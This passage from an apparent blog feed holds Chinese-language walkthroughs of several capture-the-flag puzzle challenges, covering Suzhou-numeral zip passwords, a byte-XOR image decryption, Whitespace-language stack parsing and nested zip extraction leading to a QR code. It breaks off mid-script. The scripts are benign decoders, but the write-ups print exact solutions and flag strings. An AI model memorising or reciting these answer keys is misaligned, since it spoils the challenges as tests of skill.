        <content type="html"><![CDATA[<h2 id="1-zip密码"><a href="#1-zip密码" class="headerlink" title="1.zip密码"></a>1.zip密码</h2><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%B3%A8%E9%87%8A.png"></p><h5 id="线索1"><a href="#线索1" class="headerlink" title="线索1:"></a>线索1:</h5><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;〤〤〡十〦〩〩〨十〡 –&gt; 苏州码子 –&gt; 441<strong>10</strong>6998<strong>10</strong>1</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E8%8B%8F%E5%B7%9E%E7%A0%81%E5%AD%90%E5%AF%B9%E7%85%A7%E8%A1%A8-16591884399813.png"></p><h5 id="线索2"><a href="#线索2" class="headerlink" title="线索2:"></a>线索2:</h5><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;capital_num</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/capital_num-16591886539326.png"></p><p>结合线索1: 441<strong>10</strong>6998<strong>10</strong>1，正确解压密码为：<code>肆肆壹拾陆玖玖捌拾壹</code></p><br><br><h2 id="2-分析用来加密的python脚本"><a href="#2-分析用来加密的python脚本" class="headerlink" title="2.分析用来加密的python脚本"></a>2.分析用来加密的python脚本</h2><h4 id="amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-1-根据hint-txt的提示"><a href="#amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-1-根据hint-txt的提示" class="headerlink" title="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[1].根据hint.txt的提示"></a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[1].根据hint.txt的提示</h4><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/hint.png"></p><br><h4 id="amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-2-我们直接VSCODE去分析Python脚本。"><a href="#amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-2-我们直接VSCODE去分析Python脚本。" class="headerlink" title="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[2].我们直接VSCODE去分析Python脚本。"></a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[2].我们直接VSCODE去分析Python脚本。</h4><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E5%8A%A0%E5%AF%86%E6%B5%81%E7%A8%8B.png"></p><br><br><h2 id="3-制作解密脚本"><a href="#3-制作解密脚本" class="headerlink" title="3.制作解密脚本"></a>3.制作解密脚本</h2><p>由于我们目前只有key.jpg（加密文件），所以我们需要通过<strong>解密</strong>得到file.jpg（源文件）。</p><br><h4 id="amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-1-加密解密流程如下："><a href="#amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-1-加密解密流程如下：" class="headerlink" title="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[1].加密解密流程如下："></a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[1].加密解密流程如下：</h4><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/QQ%E5%9B%BE%E7%89%8720220730221104.jpg"></p><br><h4 id="amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-2-代码如下："><a href="#amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-2-代码如下：" class="headerlink" title="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[2].代码如下："></a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[2].代码如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">data_jpg = <span class="built_in">open</span>(<span class="string">&#x27;file.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jpg_decode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        size = os.path.getsize(<span class="string">&#x27;key.jpg&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(size)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; size:</span><br><span class="line">            bytedata = handle.read(<span class="number">1</span>)</span><br><span class="line">            process_data = data_decode(bytedata)</span><br><span class="line">            data_write(process_data)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_decode</span>(<span class="params">data</span>):</span><br><span class="line">    bytedata = <span class="built_in">int</span>.from_bytes(data, byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> bytedata % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        bytedata = (bytedata + <span class="number">1</span>) ^ <span class="number">128</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bytedata = (bytedata - <span class="number">1</span>) ^ <span class="number">128</span></span><br><span class="line">    data = <span class="built_in">bytes</span>([bytedata])</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_write</span>(<span class="params">process_data</span>):</span><br><span class="line">    data_jpg.write(process_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    jpg_decode()</span><br><span class="line">    data_jpg.close()</span><br></pre></td></tr></table></figure><br><br><h2 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h2><p>运行完上面的python脚本后得到了源文件file.jpg，是一张正常的图片，但是文件的尾部不正常，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/base.png"></p><h4 id="amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-1-复制该密文去解密"><a href="#amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-1-复制该密文去解密" class="headerlink" title="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[1].复制该密文去解密"></a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[1].复制该密文去解密</h4><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/cap.png"></p><h4 id="amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-2-告诉我们使用SilentEye去解密"><a href="#amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-amp-nbsp-2-告诉我们使用SilentEye去解密" class="headerlink" title="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[2].告诉我们使用SilentEye去解密"></a>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;[2].告诉我们使用SilentEye去解密</h4><p>使用SilentEye打开flag.jpg，然后点解密，有就是Decode按钮。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/flag.png"></p><br><p><strong>flag{spider-man_is_really_cool}</strong></p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<strong>完结，拜拜！</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU-Snowfall</title>
      <link href="/posts/7979.html"/>
      <url>/posts/7979.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-知识点"><a href="#1-知识点" class="headerlink" title="1.知识点"></a>1.知识点</h2><h5 id="1-WhiteSpace，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。"><a href="#1-WhiteSpace，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。" class="headerlink" title="[1].WhiteSpace，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。"></a>[1].WhiteSpace，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。</h5><p>​<strong>它本身是个<a href="https://baike.baidu.com/item/%E6%8C%87%E4%BB%A4%E5%BC%8F">指令式</a>、基于<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>的语言。其程式运行在上的<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%99%A8">虚拟机器</a>均有一个<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88/1682032">堆栈</a>（Stack）和堆（Heap）。程式员可自由将整数推进堆栈中（只可以是整数，因为暂时并无浮点数或实数工具）。使用者亦可通过堆作为变量和数据结构的暂存区。</strong></p><h5 id="2-栈的结构，栈是先进后出。"><a href="#2-栈的结构，栈是先进后出。" class="headerlink" title="[2].栈的结构，栈是先进后出。"></a>[2].栈的结构，栈是先进后出。</h5><h5 id="3-栈的结构图："><a href="#3-栈的结构图：" class="headerlink" title="[3].栈的结构图："></a>[3].栈的结构图：</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/%E6%A0%88%E7%BB%93%E6%9E%84.webp"></p><p><br><br></p><h2 id="2-下载文件如下"><a href="#2-下载文件如下" class="headerlink" title="2.下载文件如下:"></a>2.下载文件如下:</h2><h5 id="1-使用sublime-text打开Ctrl-a全选查看，发现有很多的空格还有tab，所以我一开始也琢磨不明白，看了WP后明白了！"><a href="#1-使用sublime-text打开Ctrl-a全选查看，发现有很多的空格还有tab，所以我一开始也琢磨不明白，看了WP后明白了！" class="headerlink" title="[1].使用sublime text打开Ctrl + a全选查看，发现有很多的空格还有tab，所以我一开始也琢磨不明白，看了WP后明白了！"></a>[1].使用sublime text打开Ctrl + a全选查看，发现有很多的空格还有tab，所以我一开始也琢磨不明白，看了WP后明白了！</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-11-19.png"></p><br><br><h2 id="3-使用网站在线解析这段字符串。"><a href="#3-使用网站在线解析这段字符串。" class="headerlink" title="3.使用网站在线解析这段字符串。"></a>3.使用网站在线解析这段字符串。</h2><h5 id="1-打开WhiteSpace在线解析网站"><a href="#1-打开WhiteSpace在线解析网站" class="headerlink" title="[1].打开WhiteSpace在线解析网站"></a>[1].打开<a href="https://vii5ard.github.io/whitespace/">WhiteSpace在线解析网站</a></h5><h5 id="2-复制step1-txt到网站的文本框，然后点击run，两个run随便那个都行。"><a href="#2-复制step1-txt到网站的文本框，然后点击run，两个run随便那个都行。" class="headerlink" title="[2].复制step1.txt到网站的文本框，然后点击run，两个run随便那个都行。"></a>[2].复制step1.txt到网站的文本框，然后点击run，两个run随便那个都行。</h5><h5 id="3-结果如图"><a href="#3-结果如图" class="headerlink" title="[3].结果如图:"></a>[3].结果如图:</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-22-13.png"></p><br><h5 id="4-解析结果"><a href="#4-解析结果" class="headerlink" title="[4].解析结果:"></a>[4].解析结果:</h5><p><em><strong>OK now you can run whitespace code. By the way, the key is H0wt0Pr1ntAWh17e5p4ceC0de.</strong></em></p><p><strong>成功拿到key，显然现在不知道key有什么用处，我们现在解析step2.txt文件</strong></p><br><h5 id="5-解析step2-txt"><a href="#5-解析step2-txt" class="headerlink" title="[5].解析step2.txt"></a>[5].解析step2.txt</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-28-20.png"></p><br><h5 id="6-解析结果"><a href="#6-解析结果" class="headerlink" title="[6].解析结果:"></a>[6].解析结果:</h5><p><strong>根据7z和flag.txt很容易猜测到，这是一个7z格式的压缩包，里面的flag.txt就是我们需要的flag了。</strong></p><p><em><strong>&#x3D;&#x3D;由于我们直接复制解析结果，保存到为7z显示文件格式有误，所以只好在右边的栈流程进行操作了。&#x3D;&#x3D;</strong></em></p><p><br><br></p><h2 id="4-Python操作栈流程"><a href="#4-Python操作栈流程" class="headerlink" title="4.Python操作栈流程"></a>4.Python操作栈流程</h2><h5 id="1-首先复制栈流程保存到test-txt文件"><a href="#1-首先复制栈流程保存到test-txt文件" class="headerlink" title="[1].首先复制栈流程保存到test.txt文件"></a>[1].首先复制栈流程保存到test.txt文件</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-32-20.png"></p><br><h5 id="2-分析里面的流程。"><a href="#2-分析里面的流程。" class="headerlink" title="[2].分析里面的流程。"></a>[2].分析里面的流程。</h5><p><strong>一共是有5个函数，分别是&#x3D;&#x3D;push, printc, dup, drop, add&#x3D;&#x3D;.</strong></p><br><h5 id="3-函数功能如下"><a href="#3-函数功能如下" class="headerlink" title="[3].函数功能如下:"></a>[3].函数功能如下:</h5><p><em><strong>push:将数字压入栈顶<br>printc:将栈顶元素弹出并以ASCII字符形式输出<br>dup:复制栈顶元素后压入栈顶drop:弹出栈顶元素<br>add:将堆栈最上方的两个元素弹出，二者做加法运算,得到的结果入栈</strong></em></p><br><h5 id="4-编写python代码"><a href="#4-编写python代码" class="headerlink" title="[4].编写python代码."></a>[4].编写python代码.</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> LifoQueue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">data = data.splitlines()</span><br><span class="line"></span><br><span class="line">stack = LifoQueue()</span><br><span class="line"></span><br><span class="line">ret = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;push&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">num = <span class="built_in">int</span>(re.findall(<span class="string">&quot;push (.*?)$&quot;</span>, line)[<span class="number">0</span>])</span><br><span class="line">stack.put(num)</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;add&quot;</span>:</span><br><span class="line">stack.put(stack.get() + stack.get())</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;dup&quot;</span>:</span><br><span class="line">num = stack.get()</span><br><span class="line">stack.put(num)</span><br><span class="line">stack.put(num)</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;drop&quot;</span>:</span><br><span class="line">stack.get()</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;printc&quot;</span>:</span><br><span class="line">asc = <span class="built_in">chr</span>(stack.get())</span><br><span class="line"><span class="comment"># print(asc, end=&quot;&quot;)</span></span><br><span class="line">ret += asc</span><br><span class="line"></span><br><span class="line"><span class="comment"># save file</span></span><br><span class="line">bin_data = ret.encode(<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.7z&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(bin_data)</span><br></pre></td></tr></table></figure><p>关于代码，不太懂的去学习一下吧，我这边也是现学现卖的。</p><p>运行python代码后，轻松拿到<strong>1.7z</strong>，解压密码为之前step1.txt解析出来的key，也就是<em><strong>H0wt0Pr1ntAWh17e5p4ceC0de</strong></em></p><p><br><br></p><h2 id="5-解析flag-txt"><a href="#5-解析flag-txt" class="headerlink" title="5.解析flag.txt"></a>5.解析flag.txt</h2><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-43-56.png"></p><h5 id="1-解析flag-txt"><a href="#1-解析flag-txt" class="headerlink" title="[1].解析flag.txt"></a>[1].解析flag.txt</h5><p>由于这个也都是WhiteSpace，所以接着用网站解析，但是，这次解析结果居然为空白了：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-45-14.png"></p><br><h5 id="2-分析栈流程"><a href="#2-分析栈流程" class="headerlink" title="[2].分析栈流程"></a>[2].分析栈流程</h5><p>我们把栈流程复制粘贴到test2.txt</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-46-59.png"></p><br><p>仔细观察发现没有printc这个函数了，所以解析不出结果也很正常。我也是根据WP知道了，是要把drop这个函数换成printc.</p><br><br><h2 id="6-获取flag"><a href="#6-获取flag" class="headerlink" title="6.获取flag"></a>6.获取flag</h2><h5 id="1-稍加修改之前的脚本后，代码如下："><a href="#1-稍加修改之前的脚本后，代码如下：" class="headerlink" title="[1].稍加修改之前的脚本后，代码如下："></a>[1].稍加修改之前的脚本后，代码如下：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> LifoQueue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">data = data.splitlines()</span><br><span class="line"></span><br><span class="line">stack = LifoQueue()</span><br><span class="line"></span><br><span class="line">ret = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;push&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">num = <span class="built_in">int</span>(re.findall(<span class="string">&quot;push (.*?)$&quot;</span>, line)[<span class="number">0</span>])</span><br><span class="line">stack.put(num)</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;add&quot;</span>:</span><br><span class="line">stack.put(stack.get() + stack.get())</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;dup&quot;</span>:</span><br><span class="line">num = stack.get()</span><br><span class="line">stack.put(num)</span><br><span class="line">stack.put(num)</span><br><span class="line"><span class="keyword">elif</span> line == <span class="string">&quot;drop&quot;</span>:</span><br><span class="line">asc = <span class="built_in">chr</span>(stack.get())</span><br><span class="line"><span class="built_in">print</span>(asc, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><br><h5 id="2-运行结果"><a href="#2-运行结果" class="headerlink" title="[2].运行结果:"></a>[2].运行结果:</h5><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-28_18-50-38.png"></p><br><br><p><strong>&#x3D;&#x3D;bugku{F1xAnE5olangPr0gr4mT0Cap7ureTh3F14g}&#x3D;&#x3D;</strong></p><p><em><strong>完结！~拜拜！</strong></em></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-[MRCTF2020]: 千层套路</title>
      <link href="/posts/58219.html"/>
      <url>/posts/58219.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-信息分析"><a href="#0-信息分析" class="headerlink" title="0.信息分析"></a>0.信息分析</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-12_14-00-18.png"></p><p>根据图片的线索测试了一下 <strong>0573.zip</strong> 的密码就是 <strong>0573</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-07-12_14-04-23.png"></p><h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h3><p>​<strong>经过测试：0573.zip –&gt; 密码0573，0114.zip –&gt; 密码0114，一直套娃下去。</strong></p><br><h1 id="1-目录结构如下："><a href="#1-目录结构如下：" class="headerlink" title="1.目录结构如下："></a>1.目录结构如下：</h1><p><strong>[MRCTF2020]千层套路</strong></p><p>├─Example.py<br>├─0573.zip<br>├─flag<br>└─zips</p><br><h1 id="2-使用python解决套娃问题"><a href="#2-使用python解决套娃问题" class="headerlink" title="2.使用python解决套娃问题"></a>2.使用python解决套娃问题</h1><p><strong>Example.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zip_name = <span class="string">&quot;0573.zip&quot;</span></span><br><span class="line">password = <span class="string">&quot;0573&quot;</span></span><br><span class="line">zips_path = <span class="string">&quot;./zips&quot;</span></span><br><span class="line">flag_path = <span class="string">&quot;./flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">zip</span> = zipfile.ZipFile(zip_name, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    file_name = <span class="built_in">zip</span>.namelist()[<span class="number">0</span>]</span><br><span class="line">    suffix_name = <span class="built_in">zip</span>.namelist()[<span class="number">0</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> suffix_name == <span class="string">&quot;zip&quot;</span>:</span><br><span class="line">        <span class="built_in">zip</span>.extractall(zips_path, pwd=password.encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">zip</span>.extractall(flag_path)</span><br><span class="line">        exit()</span><br><span class="line">    </span><br><span class="line">    zip_name = os.path.join(zips_path, file_name)</span><br><span class="line">    password = <span class="built_in">zip</span>.namelist()[<span class="number">0</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><br><h1 id="3-执行代码后目录结构如下："><a href="#3-执行代码后目录结构如下：" class="headerlink" title="3.执行代码后目录结构如下："></a>3.执行代码后目录结构如下：</h1><p><strong>[MRCTF2020]千层套路</strong></p><p>├─Example.py<br>├─0573.zip<br>├─zips <strong>（把套娃的压缩包全放这个目录）</strong><br>        ─ qr.zip<br>        ─ 1000.zip<br>        ─ …<br>        ─ 0007.zip<br>├─flag</p><p>​─ qr.txt<strong>（执行脚本后获得的）</strong></p><h3 id="qr-txt内容如下："><a href="#qr-txt内容如下：" class="headerlink" title="qr.txt内容如下："></a><strong>qr.txt内容如下：</strong></h3><table><thead><tr><th align="center">行</th><th align="center">内容</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">(255, 255, 255)</td></tr><tr><td align="center">2</td><td align="center">(255, 255, 255)</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">40000</td><td align="center">(255, 255, 255)</td></tr></tbody></table><p>如果有一些opencv基础的话很容易知道：</p><p>​<strong>40000个像素点，RGB(红绿蓝)3通道，根据文件名qr，也可以猜到是二维码！</strong></p><br><h1 id="4-绘制二维码"><a href="#4-绘制二维码" class="headerlink" title="4.绘制二维码"></a>4.绘制二维码</h1><h3 id="0-目录结构如下："><a href="#0-目录结构如下：" class="headerlink" title="0.目录结构如下："></a>0.目录结构如下：</h3><p>├─Example.py<br>├─0573.zip<br>├─flag<br>├─<strong>opencv-绘制二维码.py</strong><br>├─<strong>pil-绘制二维码.py</strong><br>└─zips</p><h3 id="1-opencv-绘制二维码-py"><a href="#1-opencv-绘制二维码-py" class="headerlink" title="1.opencv-绘制二维码.py"></a>1.opencv-绘制二维码.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;./flag/qr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">arr = [<span class="built_in">eval</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> file.splitlines()]</span><br><span class="line">img = np.array(arr, dtype=np.uint8).reshape((<span class="number">200</span>, <span class="number">200</span>, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">&quot;image&quot;</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><br><h3 id="2-pil-绘制二维码-py"><a href="#2-pil-绘制二维码-py" class="headerlink" title="2.pil-绘制二维码.py"></a>2.pil-绘制二维码.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">max</span> = <span class="number">200</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;./flag/qr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="built_in">max</span>, <span class="built_in">max</span>))</span><br><span class="line"><span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="built_in">max</span>), <span class="built_in">range</span>(<span class="built_in">max</span>)):</span><br><span class="line">    pixel = <span class="built_in">eval</span>(file.readline())</span><br><span class="line">    img.putpixel([x, y], pixel)</span><br><span class="line"></span><br><span 